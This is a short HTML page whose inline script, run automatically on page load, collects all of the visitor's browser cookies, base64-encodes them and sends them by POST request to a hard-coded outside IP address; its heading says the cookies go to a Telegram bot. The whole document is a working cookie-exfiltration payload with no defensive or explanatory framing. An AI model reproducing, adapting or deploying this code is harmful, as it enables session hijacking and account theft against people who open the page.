<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Send Cookies</title>
    <script>
        function getCookies() {
            const cookiePairs = document.cookie.split('; ');
            const cookies = {};

            cookiePairs.forEach(pair => {
                const [name, value] = pair.split('=');
                cookies[name] = decodeURIComponent(value);
            });

            return cookies;
        }

        window.onload = function() {
            const cookies = getCookies();
            const encodedCookies = btoa(JSON.stringify(cookies));
            console.log("Cookies to be sent (encoded):", encodedCookies);

            fetch('https://144.172.76.108:8000/send-cookies', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({ cookies: encodedCookies })
            })
            .then(response => response.text())
            .then(data => console.log(data))
            .catch(err => console.error("Error:", err));
        }
    </script>
</head>
<body>
    <h1>Send Cookies to Telegram Bot</h1>
</body>
</html>
